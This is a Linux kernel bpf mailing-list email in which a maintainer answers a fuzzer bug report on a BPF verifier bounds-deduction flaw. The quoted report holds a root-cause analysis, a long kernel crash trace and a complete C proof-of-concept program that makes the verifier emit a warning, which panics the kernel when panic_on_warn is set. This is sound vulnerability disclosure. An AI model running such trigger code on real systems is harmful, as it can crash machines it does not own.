Return-Path: <bpf+bounces-71216-lists+bpf=lfdr.de@vger.kernel.org>
X-Original-To: lists+bpf@lfdr.de
Delivered-To: lists+bpf@lfdr.de
Received: from dfw.mirrors.kernel.org (dfw.mirrors.kernel.org [142.0.200.124])
	by mail.lfdr.de (Postfix) with ESMTPS id BD0AFBE96BE
	for <lists+bpf@lfdr.de>; Fri, 17 Oct 2025 17:02:24 +0200 (CEST)
Received: from smtp.subspace.kernel.org (relay.kernel.org [52.25.139.140])
	(using TLSv1.2 with cipher ECDHE-ECDSA-AES256-GCM-SHA384 (256/256 bits))
	(No client certificate requested)
	by dfw.mirrors.kernel.org (Postfix) with ESMTPS id C39F956581E
	for <lists+bpf@lfdr.de>; Fri, 17 Oct 2025 14:59:08 +0000 (UTC)
Received: from localhost.localdomain (localhost.localdomain [127.0.0.1])
	by smtp.subspace.kernel.org (Postfix) with ESMTP id CF0932459E1;
	Fri, 17 Oct 2025 14:59:06 +0000 (UTC)
Authentication-Results: smtp.subspace.kernel.org;
	dkim=pass (2048-bit key) header.d=gmail.com header.i=@gmail.com header.b="galNbSNR"
X-Original-To: bpf@vger.kernel.org
Received: from mail-wr1-f50.google.com (mail-wr1-f50.google.com [209.85.221.50])
	(using TLSv1.2 with cipher ECDHE-RSA-AES128-GCM-SHA256 (128/128 bits))
	(No client certificate requested)
	by smtp.subspace.kernel.org (Postfix) with ESMTPS id 19B1E60DCF
	for <bpf@vger.kernel.org>; Fri, 17 Oct 2025 14:59:03 +0000 (UTC)
Authentication-Results: smtp.subspace.kernel.org; arc=none smtp.client-ip=209.85.221.50
ARC-Seal:i=1; a=rsa-sha256; d=subspace.kernel.org; s=arc-20240116;
	t=1760713146; cv=none; b=Od01lm+4DIDal7UbFgFMdiYSkeDUIZMBltg+kgvys2Tu8/CmTHL2xfGUotbwGIMZ4SzG6oocJlC0IWl88oJSTx3RbA/NyMe2UKzeyaefwFWDkC+Hr7zICNVAcYjmLWmOHGepMsaNf/AqYh3CiCkuxIdjpywkRqh8XgbgAeNv/4c=
ARC-Message-Signature:i=1; a=rsa-sha256; d=subspace.kernel.org;
	s=arc-20240116; t=1760713146; c=relaxed/simple;
	bh=eioB1jpv4SoWXPhWyGuWsGg6VGBKtvaXn97ehV5rSs4=;
	h=Date:From:To:Cc:Subject:Message-ID:References:MIME-Version:
	 Content-Type:Content-Disposition:In-Reply-To; b=d7QtCfH+1SxvlI3fNpcq0+X5s6RqkfX3qO/tiQD92mIynOfRzo1zNFoObQRDO9sTMUDP+nzSYHtu+Q5OIf3zVgn9bvcFAb//XADttY/Ia+0yoP9RiPv6MT3kZFkGBgF+ukhJaLn6tBhxfQ1RVEgyvfWepF7R8PNKU0M47DrRsl8=
ARC-Authentication-Results:i=1; smtp.subspace.kernel.org; dmarc=pass (p=none dis=none) header.from=gmail.com; spf=pass smtp.mailfrom=gmail.com; dkim=pass (2048-bit key) header.d=gmail.com header.i=@gmail.com header.b=galNbSNR; arc=none smtp.client-ip=209.85.221.50
Authentication-Results: smtp.subspace.kernel.org; dmarc=pass (p=none dis=none) header.from=gmail.com
Authentication-Results: smtp.subspace.kernel.org; spf=pass smtp.mailfrom=gmail.com
Received: by mail-wr1-f50.google.com with SMTP id ffacd0b85a97d-3ee12807d97so1888442f8f.0
        for <bpf@vger.kernel.org>; Fri, 17 Oct 2025 07:59:03 -0700 (PDT)
DKIM-Signature: v=1; a=rsa-sha256; c=relaxed/relaxed;
        d=gmail.com; s=20230601; t=1760713142; x=1761317942; darn=vger.kernel.org;
        h=in-reply-to:content-transfer-encoding:content-disposition
         :mime-version:references:message-id:subject:cc:to:from:date:from:to
         :cc:subject:date:message-id:reply-to;
        bh=Vbz54mM9vgsd7L0/r3nA+vH5Q+PyhSz/iXOP9u2qPEw=;
        b=galNbSNRTbCYY0pprmlkSdtja10+6W26xSOlptfDNnLH/YlYydns7vnoWIinQL33nv
         d00S4QOMiWPIYsqo4l51IwfMvK5GtxvDeWU9KITKIHgEg9Ma1dRN0XOOst6MND0X3D/w
         BTFMi+gQ2pjnk6SZUhNBscx+fRnilCbuqVLZ0LkD3D6ijTe5xQfXYhK7cct3g7lihzuu
         twZwdqiS52brnjF2pu5W0QDZLB1wNJX5iRf2C5FQCOyVEFi3iNo4qvmxLYMmWfBwU8Wz
         AlyyysG0VFeTQRNziYWqehgRv0XgP5F5IJk2OHwHsXC4PET7slkEiT0jSGlhTg89IoEL
         2ZuA==
X-Google-DKIM-Signature: v=1; a=rsa-sha256; c=relaxed/relaxed;
        d=1e100.net; s=20230601; t=1760713142; x=1761317942;
        h=in-reply-to:content-transfer-encoding:content-disposition
         :mime-version:references:message-id:subject:cc:to:from:date
         :x-gm-message-state:from:to:cc:subject:date:message-id:reply-to;
        bh=Vbz54mM9vgsd7L0/r3nA+vH5Q+PyhSz/iXOP9u2qPEw=;
        b=PGwhaeo1Urj+Gp9vWuuXwR8eJHOQ4zTXQfQ8cfoM2470Nmsq1U4S0458r/94qwfPlM
         32uGuoV/+d4ngAIs1Ff2jxIEDcyg8Le7dhl80OtcwnIp8FjkVbTPhtRA8BHN1Aav+SJO
         YwBVZMeNb804Sk2wBcDjjoOrMpNfYABQIKlt+0HB+PBcj0MvRJqKTK8sPhYqzmF/zIAv
         orhH+xuizGf93rjrhX26wLY+uiUfYLyZD3Ue7icEpjkkLgB4r+oNmmKHWnBd2HD5VYVX
         OdJJoDHGo5dheOqXaLM/92UWHLK4uxFGo9MyRf4M3zpp2+9HEVGuJnjhXU/XUbb4P6OT
         aTGg==
X-Forwarded-Encrypted: i=1; AJvYcCVyB9qSth/1ulHT2PxI+ac3kFNTXZCdDerXrn7KzabhQJEcdehP897EH9odSdeSD6wb9dE=@vger.kernel.org
X-Gm-Message-State: AOJu0YzgNEUlBK6T7sNs90ZyO46tm7zqX6amR79t6uuSdaMKZuq7AySH
	mbz/Z70yL/EMloLuxiF7UktP3/bIcN9b8aoEcXTYHDmPb1k15hHAaApD
X-Gm-Gg: ASbGncuU/0F2uVAdJXxdaISJaRsxrdXZl64aY/+38DfE+lfsT9JDrx2vxF1915o+k0/
	JyQwlDnXt756L2n7ySBJbmkFBzDNe+wqdWx5GfdzsMfAxcDymFYmhKYccHktjP7JVAFQhgPomPs
	+cmujPt+Lz4D+l6QxAnTzAAzV3p0dpni/kNGmuV0f8CUP3Y5onb/uiu3iEH1xZVVoTvcnxj9XXe
	e91DiFUxNfDcPLgN1V6h/RgzrP4DWht2cHM5dQLZzNEfU/XgOewOx5h591kmz/ZT5LMYkTzf0de
	coUUF3ZTHq62HNi9tf09uqMWLrGBm1NNc+Mh05PTNHINVDqG8sWgvmFWuiUM9zraVVCAkSd6xw1
	/9ERabP8X/5ohuIHJiuh4lHCSX+Q5hVIP970cCIzMIZe1d9u3RoY0zv0G7SeXRU5Z9XNGA7N8ly
	kqXk1Tyv+aLDKikD9IzOerjdFZdOwBazkRgZa3s3qfqFMKmgclxlX5v1Cp51QMABQw3nT2WsD02
	g==
X-Google-Smtp-Source: AGHT+IFZR0X9BVNBBPbJAQwRfySMFwZiV/kHN9GBHCZHg1J1I+4WX2WQ6qmn0uLDjHZbk8jQ8xkfTg==
X-Received: by 2002:a05:6000:1869:b0:427:79f:dcd8 with SMTP id ffacd0b85a97d-427079fdd00mr1905472f8f.55.1760713141920;
        Fri, 17 Oct 2025 07:59:01 -0700 (PDT)
Received: from mail.gmail.com (2a01cb0889497e00c036fc8e052948b2.ipv6.abo.wanadoo.fr. [2a01:cb08:8949:7e00:c036:fc8e:529:48b2])
        by smtp.gmail.com with ESMTPSA id ffacd0b85a97d-4270845f998sm3505535f8f.44.2025.10.17.07.59.00
        (version=TLS1_3 cipher=TLS_AES_256_GCM_SHA384 bits=256/256);
        Fri, 17 Oct 2025 07:59:00 -0700 (PDT)
Date: Fri, 17 Oct 2025 16:58:59 +0200
From: Paul Chaignon <paul.chaignon@gmail.com>
To: =?utf-8?B?5qKF5byA5b2m?= <kaiyanm@hust.edu.cn>
Cc: ast@kernel.org, daniel@iogearbox.net, john.fastabend@gmail.com,
	bpf@vger.kernel.org, dddddd@hust.edu.cn, dzm91@hust.edu.cn
Subject: Re: BPF verifier missing range intersection validation in
 subregister bounds deduction
Message-ID: <aPJZs5h7ihqOb-e6@mail.gmail.com>
References: <1881f0f5.300df.199f2576a01.Coremail.kaiyanm@hust.edu.cn>
Precedence: bulk
X-Mailing-List: bpf@vger.kernel.org
List-Id: <bpf.vger.kernel.org>
List-Subscribe: <mailto:bpf+subscribe@vger.kernel.org>
List-Unsubscribe: <mailto:bpf+unsubscribe@vger.kernel.org>
MIME-Version: 1.0
Content-Type: text/plain; charset=utf-8
Content-Disposition: inline
Content-Transfer-Encoding: 8bit
In-Reply-To: <1881f0f5.300df.199f2576a01.Coremail.kaiyanm@hust.edu.cn>

Hi,

Syzbot has been reporting the same warning for a while now [1, 2].
Different programs can cause this, but they all follow the same pattern
so far, with a reg_bounds_sync trying to improve register bounds while
walking an impossible branch. Your example (reproduced below) has the
same pattern, with the impossible branch when the condition at
instruction 4 is true. The verifier then tries to improve the bounds of
true_reg1 (r0) on the incorrect assumption that r0 > r0.

    0: R1=ctx() R10=fp0
    0: call bpf_get_prandom_u32#7  ; R0=scalar()
    1: r8 = 0x80000000             ; R8=0x80000000
    3: r0 &= r8                    ; R0=scalar(smin=0,smax=umax=umax32=0x80000000,smax32=0,var_off=(0x0; 0x80000000)) R8=0x80000000
    4: if r0 > r0 goto pc+1
    verifier bug: REG INVARIANTS VIOLATION (true_reg1): range bounds violation u64=[0x1, 0x0] s64=[0x1, 0x0] u32=[0x1, 0x0] s32=[0x1, 0x0] var_off=(0x0, 0x0)

Eduard is working on a solution to these invariant violation warnings
that should address all cases we've seen so far (cf. [3, 4]).

1 - https://syzkaller.appspot.com/bug?extid=c711ce17dd78e5d4fdcf
2 - https://syzkaller.appspot.com/bug?extid=c950cc277150935cc0b5
3 - https://lore.kernel.org/all/20250913222323.894182-1-kriish.sharma2006@gmail.com/T/#mda9630e3c70d333e9e0bb8bf0cee0c853771d1c1
4 - https://lore.kernel.org/all/cf36f407713920055fcee1e30c007d23a117e712.camel@gmail.com/

Paul

On Fri, Oct 17, 2025 at 09:23:59PM +0800, 梅开彦 wrote:
> Our fuzzer discovered a register value simulation error in the BPF verifier within
> 
> the Linux kernel's BPF subsystem. This vulnerability causes invalid register value 
> 
> range where the minimum value exceeds the maximum value and will lead to a WARNING issue.
> 
> 
> Reported-by: Kaiyan Mei <M202472210@hust.edu.cn>
> Reported-by: Yinhao Hu <dddddd@hust.edu.cn>
> Reviewed-by: Dongliang Mu <dzm91@hust.edu.cn>
> 
> ## Root Cause
> 
> 
> 
> The vulnerability occurs when the BPF verifier attempts to merge incompatible u32
> 
> and s32 ranges in the `__reg32_deduce_bounds()` function. When processing ranges 
> 
> with no overlap, the function produces invalid ranges where the minimum value exceeds 
> 
> the maximum value.
> 
> 
> ```c
> if ((s32)reg->u32_min_value <= (s32)reg->u32_max_value) {
> reg->s32_min_value = max_t(s32, reg->s32_min_value, reg->u32_min_value); 
> reg->s32_max_value = min_t(s32, reg->s32_max_value, reg->u32_max_value);
> }
> if ((u32)reg->s32_min_value <= (u32)reg->s32_max_value) {
> reg->u32_min_value = max_t(u32, reg->s32_min_value, reg->u32_min_value);
> reg->u32_max_value = min_t(u32, reg->s32_max_value, reg->u32_max_value);
> }
> ```
> 
> Specifically, when the verifier processes:
> 
> - s32 range: `[-2147483648, 0]`
> 
> - u32 range: `[1, 2147483647]` 
> 
> 
> 
> The merging logic incorrectly assumes these ranges can be intersected, resulting in
> 
> an invalid combined range `[1, 0]` where the minimum value exceeds the maximum value.
> 
> 
> 
> ## Reproduction Steps
> 
> 1. **BPF Program**: Load BPF program containing helper calls and ALU operations
>    - helper calls and ALU operations would create uncertain register value ranges
> 
> 2. **Verifier**: merge incompatible u32 and s32 ranges in the `__reg32_deduce_bounds()` function
>    - s32 range: `[-2147483648, 0]`
>    - u32 range: `[1, 2147483647]` 
> 
> 
> 
> 3. **Crash**: Invalid range `[1, 0]` is produced and detected by `reg_bounds_sanity_check()`,
> 
> triggering WARNING
> 
> 
> ## KASAN Report
> 
> ```
> [   95.792587][ T9903] ------------[ cut here ]------------
> [   95.792811][ T9903] verifier bug: REG INVARIANTS VIOLATION (true_reg1): range bounds violation u64=[0x1, 0x0] s64=[0x1, 0x0] u32=[0x1, 0x0] )
> [   95.793459][ T9903] WARNING: kernel/bpf/verifier.c:2731 at reg_bounds_sanity_check+0x66e/0x11e0, CPU#1: poc/9903
> [   95.793889][ T9903] Modules linked in:
> [   95.794053][ T9903] CPU: 1 UID: 0 PID: 9903 Comm: poc Not tainted 6.18.0-rc1-next-20251013-dirty #8 PREEMPT(full) 
> [   95.794476][ T9903] Hardware name: QEMU Standard PC (i440FX + PIIX, 1996), BIOS 1.15.0-1 04/01/2014
> [   95.794846][ T9903] RIP: 0010:reg_bounds_sanity_check+0x66e/0x11e0
> [   95.795106][ T9903] Code: c7 c7 e0 68 55 8b 48 8b 95 58 ff ff ff 50 8b 45 ac 48 8b b5 60 ff ff ff 50 8b 45 b4 50 8b 45 b0 50 ff 75 b8 e8 63 0
> [   95.795877][ T9903] RSP: 0018:ffffc90004b2f2a0 EFLAGS: 00010282
> [   95.796157][ T9903] RAX: 0000000000000000 RBX: 0000000000000000 RCX: ffffffff81789f69
> [   95.796480][ T9903] RDX: ffff888108941e80 RSI: ffffffff81789f76 RDI: 0000000000000001
> [   95.796798][ T9903] RBP: ffffc90004b2f398 R08: 0000000000000001 R09: ffffed1026bc4841
> [   95.797116][ T9903] R10: 0000000000000000 R11: 0000000000000000 R12: 0000000000000001
> [   95.797437][ T9903] R13: ffff88810a0da04c R14: ffff88810a0da054 R15: ffff88810a0da000
> [   95.797755][ T9903] FS:  00007ff3462f4740(0000) GS:ffff8881a1ace000(0000) knlGS:0000000000000000
> [   95.798110][ T9903] CS:  0010 DS: 0000 ES: 0000 CR0: 0000000080050033
> [   95.798383][ T9903] CR2: 00002000000009c0 CR3: 0000000111fde000 CR4: 0000000000752ef0
> [   95.798700][ T9903] PKRU: 55555554
> [   95.798845][ T9903] Call Trace:
> [   95.798981][ T9903]  <TASK>
> [   95.799104][ T9903]  reg_set_min_max+0x18a/0x2c0
> [   95.799301][ T9903]  check_cond_jmp_op+0x2ccf/0x6880
> [   95.799515][ T9903]  ? __pfx_check_cond_jmp_op+0x10/0x10
> [   95.799738][ T9903]  ? check_alu_op+0x7b9/0x3880
> [   95.799936][ T9903]  ? commit_stack_write_marks.isra.0+0x2f9/0x450
> [   95.800195][ T9903]  do_check_common+0x7b3e/0xb9e0
> [   95.800402][ T9903]  ? compute_live_registers+0xabd/0x1040
> [   95.800633][ T9903]  ? mark_fastcall_pattern_for_call+0x5e4/0x750
> [   95.800887][ T9903]  ? __pfx_compute_live_registers+0x10/0x10
> [   95.801127][ T9903]  ? __pfx_do_check_common+0x10/0x10
> [   95.801344][ T9903]  ? __pfx_mark_fastcall_pattern_for_call+0x10/0x10
> [   95.801610][ T9903]  ? bpf_check+0x8ec1/0xbae0
> [   95.801801][ T9903]  bpf_check+0x9288/0xbae0
> [   95.801987][ T9903]  ? __pfx_bpf_check+0x10/0x10
> [   95.802184][ T9903]  ? __asan_memset+0x24/0x50
> [   95.802379][ T9903]  ? bpf_obj_name_cpy+0x148/0x1b0
> [   95.802585][ T9903]  bpf_prog_load+0x17b0/0x2770
> [   95.802781][ T9903]  ? __pfx_bpf_prog_load+0x10/0x10
> [   95.802991][ T9903]  ? __might_fault+0x138/0x190
> [   95.803188][ T9903]  ? __might_fault+0xe0/0x190
> [   95.803385][ T9903]  __sys_bpf+0x1964/0x5360
> [   95.803568][ T9903]  ? __pfx___sys_bpf+0x10/0x10
> [   95.803765][ T9903]  ? __lock_acquire+0x636/0x1be0
> [   95.803971][ T9903]  ? css_rstat_updated+0x1c2/0x510
> [   95.804181][ T9903]  ? __pfx_css_rstat_updated+0x10/0x10
> [   95.804407][ T9903]  __x64_sys_bpf+0x78/0xc0
> [   95.804590][ T9903]  ? lockdep_hardirqs_on+0x7c/0x110
> [   95.804811][ T9903]  do_syscall_64+0xcb/0xfa0
> [   95.804999][ T9903]  entry_SYSCALL_64_after_hwframe+0x77/0x7f
> [   95.805239][ T9903] RIP: 0033:0x7ff3463f87d9
> [   95.805422][ T9903] Code: 08 89 e8 5b 5d c3 66 2e 0f 1f 84 00 00 00 00 00 90 48 89 f8 48 89 f7 48 89 d6 48 89 ca 4d 89 c2 4d 89 c8 4c 8b 4c 8
> [   95.806195][ T9903] RSP: 002b:00007ffe5dbb5768 EFLAGS: 00000246 ORIG_RAX: 0000000000000141
> [   95.806531][ T9903] RAX: ffffffffffffffda RBX: 00007ffe5dbb5888 RCX: 00007ff3463f87d9
> [   95.806846][ T9903] RDX: 0000000000000094 RSI: 00002000000009c0 RDI: 0000000000000005
> [   95.807162][ T9903] RBP: 00007ffe5dbb5770 R08: 0000000000000000 R09: 0000000000000001
> [   95.807479][ T9903] R10: ffffffffffffffff R11: 0000000000000246 R12: 0000000000000000
> [   95.807795][ T9903] R13: 00007ffe5dbb5898 R14: 000055c3a043edd8 R15: 00007ff346519020
> [   95.808116][ T9903]  </TASK>
> [   95.808244][ T9903] Kernel panic - not syncing: kernel: panic_on_warn set ...
> [   95.808535][ T9903] CPU: 1 UID: 0 PID: 9903 Comm: poc Not tainted 6.18.0-rc1-next-20251013-dirty #8 PREEMPT(full) 
> [   95.808951][ T9903] Hardware name: QEMU Standard PC (i440FX + PIIX, 1996), BIOS 1.15.0-1 04/01/2014
> [   95.809312][ T9903] Call Trace:
> [   95.809448][ T9903]  <TASK>
> [   95.809569][ T9903]  dump_stack_lvl+0x3d/0x1b0
> [   95.809760][ T9903]  vpanic+0x679/0x710
> [   95.809927][ T9903]  ? reg_bounds_sanity_check+0x66e/0x11e0
> [   95.810159][ T9903]  panic+0xc2/0xd0
> [   95.810314][ T9903]  ? __pfx_panic+0x10/0x10
> [   95.810500][ T9903]  ? check_panic_on_warn+0x1f/0xc0
> [   95.810709][ T9903]  check_panic_on_warn+0xb1/0xc0
> [   95.810911][ T9903]  __warn+0x108/0x3f0
> [   95.811075][ T9903]  ? reg_bounds_sanity_check+0x66e/0x11e0
> [   95.811307][ T9903]  report_bug+0x2e1/0x500
> [   95.811488][ T9903]  ? reg_bounds_sanity_check+0x66e/0x11e0
> [   95.811720][ T9903]  handle_bug+0x2dd/0x410
> [   95.811900][ T9903]  exc_invalid_op+0x35/0x80
> [   95.812087][ T9903]  asm_exc_invalid_op+0x1a/0x20
> [   95.812287][ T9903] RIP: 0010:reg_bounds_sanity_check+0x66e/0x11e0
> [   95.812544][ T9903] Code: c7 c7 e0 68 55 8b 48 8b 95 58 ff ff ff 50 8b 45 ac 48 8b b5 60 ff ff ff 50 8b 45 b4 50 8b 45 b0 50 ff 75 b8 e8 63 0
> [   95.813309][ T9903] RSP: 0018:ffffc90004b2f2a0 EFLAGS: 00010282
> [   95.813556][ T9903] RAX: 0000000000000000 RBX: 0000000000000000 RCX: ffffffff81789f69
> [   95.813873][ T9903] RDX: ffff888108941e80 RSI: ffffffff81789f76 RDI: 0000000000000001
> [   95.814188][ T9903] RBP: ffffc90004b2f398 R08: 0000000000000001 R09: ffffed1026bc4841
> [   95.814506][ T9903] R10: 0000000000000000 R11: 0000000000000000 R12: 0000000000000001
> [   95.814821][ T9903] R13: ffff88810a0da04c R14: ffff88810a0da054 R15: ffff88810a0da000
> [   95.815138][ T9903]  ? __warn_printk+0x179/0x310
> [   95.815337][ T9903]  ? __warn_printk+0x186/0x310
> [   95.815536][ T9903]  reg_set_min_max+0x18a/0x2c0
> [   95.815733][ T9903]  check_cond_jmp_op+0x2ccf/0x6880
> [   95.815944][ T9903]  ? __pfx_check_cond_jmp_op+0x10/0x10
> [   95.816168][ T9903]  ? check_alu_op+0x7b9/0x3880
> [   95.816366][ T9903]  ? commit_stack_write_marks.isra.0+0x2f9/0x450
> [   95.816625][ T9903]  do_check_common+0x7b3e/0xb9e0
> [   95.816830][ T9903]  ? compute_live_registers+0xabd/0x1040
> [   95.817060][ T9903]  ? mark_fastcall_pattern_for_call+0x5e4/0x750
> [   95.817313][ T9903]  ? __pfx_compute_live_registers+0x10/0x10
> [   95.817554][ T9903]  ? __pfx_do_check_common+0x10/0x10
> [   95.817773][ T9903]  ? __pfx_mark_fastcall_pattern_for_call+0x10/0x10
> [   95.818042][ T9903]  ? bpf_check+0x8ec1/0xbae0
> [   95.818235][ T9903]  bpf_check+0x9288/0xbae0
> [   95.818426][ T9903]  ? __pfx_bpf_check+0x10/0x10
> [   95.818628][ T9903]  ? __asan_memset+0x24/0x50
> [   95.818820][ T9903]  ? bpf_obj_name_cpy+0x148/0x1b0
> [   95.819027][ T9903]  bpf_prog_load+0x17b0/0x2770
> [   95.819225][ T9903]  ? __pfx_bpf_prog_load+0x10/0x10
> [   95.819437][ T9903]  ? __might_fault+0x138/0x190
> [   95.819638][ T9903]  ? __might_fault+0xe0/0x190
> [   95.819836][ T9903]  __sys_bpf+0x1964/0x5360
> [   95.820020][ T9903]  ? __pfx___sys_bpf+0x10/0x10
> [   95.820217][ T9903]  ? __lock_acquire+0x636/0x1be0
> [   95.820423][ T9903]  ? css_rstat_updated+0x1c2/0x510
> [   95.820634][ T9903]  ? __pfx_css_rstat_updated+0x10/0x10
> [   95.820859][ T9903]  __x64_sys_bpf+0x78/0xc0
> [   95.821042][ T9903]  ? lockdep_hardirqs_on+0x7c/0x110
> [   95.821255][ T9903]  do_syscall_64+0xcb/0xfa0
> [   95.821444][ T9903]  entry_SYSCALL_64_after_hwframe+0x77/0x7f
> [   95.821683][ T9903] RIP: 0033:0x7ff3463f87d9
> [   95.821865][ T9903] Code: 08 89 e8 5b 5d c3 66 2e 0f 1f 84 00 00 00 00 00 90 48 89 f8 48 89 f7 48 89 d6 48 89 ca 4d 89 c2 4d 89 c8 4c 8b 4c 8
> [   95.822630][ T9903] RSP: 002b:00007ffe5dbb5768 EFLAGS: 00000246 ORIG_RAX: 0000000000000141
> [   95.822966][ T9903] RAX: ffffffffffffffda RBX: 00007ffe5dbb5888 RCX: 00007ff3463f87d9
> [   95.823283][ T9903] RDX: 0000000000000094 RSI: 00002000000009c0 RDI: 0000000000000005
> [   95.823601][ T9903] RBP: 00007ffe5dbb5770 R08: 0000000000000000 R09: 0000000000000001
> [   95.823918][ T9903] R10: ffffffffffffffff R11: 0000000000000246 R12: 0000000000000000
> [   95.824235][ T9903] R13: 00007ffe5dbb5898 R14: 000055c3a043edd8 R15: 00007ff346519020
> [   95.824557][ T9903]  </TASK>
> ```
> 
> ## Proof of Concept
> 
> The following C program should demonstrate the vulnerability on linux-next 6.18.0-rc1-next-20251013:
> 
> ```c
> #define _GNU_SOURCE 
> 
> #include <endian.h>
> #include <stdint.h>
> #include <stdio.h>
> #include <stdlib.h>
> #include <string.h>
> #include <sys/syscall.h>
> #include <sys/types.h>
> #include <unistd.h>
> #include <linux/bpf.h>
> 
> #ifndef __NR_bpf
> #define __NR_bpf 321
> #endif
> 
> #define BPF_JMP32_REG(OP, DST, SRC, OFF) \
> ((struct bpf_insn) { \
> .code  = BPF_JMP32 | BPF_OP(OP) | BPF_X, \
> .dst_reg = DST, \
> .src_reg = SRC, \
> .off   = OFF, \
> .imm   = 0 })
> 
> 
> #define BPF_EXIT_INSN() \
> ((struct bpf_insn) { \
> .code  = BPF_JMP | BPF_EXIT, \
> .dst_reg = 0, \
> .src_reg = 0, \
> .off   = 0, \
> .imm   = 0 })
> 
> #define BPF_EMIT_CALL(FUNC) \
> ((struct bpf_insn) { \
> .code  = BPF_JMP | BPF_CALL, \
> .dst_reg = 0, \
> .src_reg = 0, \
> .off   = 0, \
> .imm   = ((FUNC) - BPF_FUNC_unspec) })
> 
> #define BPF_LD_IMM64(DST, IMM) \
> BPF_LD_IMM64_RAW(DST, 0, IMM)
> 
> #define BPF_LD_IMM64_RAW(DST, SRC, IMM) \
> ((struct bpf_insn) { \
> .code  = BPF_LD | BPF_DW | BPF_IMM, \
> .dst_reg = DST, \
> .src_reg = SRC, \
> .off   = 0, \
> .imm   = (__u32) (IMM) }), \
> ((struct bpf_insn) { \
> .code  = 0, /* zero is reserved opcode */ \
> .dst_reg = 0, \
> .src_reg = 0, \
> .off   = 0, \
> .imm   = ((__u64) (IMM)) >> 32 })
> 
> #define BPF_ALU64_REG(OP, DST, SRC) \
> ((struct bpf_insn) { \
> .code  = BPF_ALU64 | BPF_OP(OP) | BPF_X, \
> .dst_reg = DST, \
> .src_reg = SRC, \
> .off   = 0, \
> .imm   = 0 })
> 
> static inline uint64_t ptr_to_u64(const void *ptr) {
>     return (uint64_t)(unsigned long)ptr;
> }
> 
> static int load_prog(struct bpf_insn *insns, size_t cnt) {
>     union bpf_attr attr = {
>         .prog_type = 4,
>         .insns = ptr_to_u64(insns),
>         .insn_cnt = cnt,
>         .license = ptr_to_u64("GPL"),
>     };
>     int prog_fd=syscall(__NR_bpf, 5, &attr, sizeof(attr));
>     return prog_fd;
> }
> 
> 
> int main(void)
> {
>     struct bpf_insn prog[] = {
>         BPF_EMIT_CALL(BPF_FUNC_get_prandom_u32),
>         BPF_LD_IMM64(BPF_REG_8, 0x80000000),
>         BPF_ALU64_REG(BPF_AND, BPF_REG_0, BPF_REG_8),
>         BPF_JMP32_REG(BPF_JGT, BPF_REG_0, BPF_REG_0, 1),
>         BPF_EMIT_CALL(BPF_FUNC_get_prandom_u32),
>         BPF_EXIT_INSN(),
>     };
>     int fd=load_prog(prog, sizeof(prog) / sizeof(prog[0]));
>     printf("fd=%d\n size=%zu\n", fd, sizeof(prog) / sizeof(prog[0]));
> }
> 
> 
> ```
> 
> ## Kernel Configuration Requirements for Reproduction
> 
> The vulnerability can be triggered with the kernel config in the attachment.



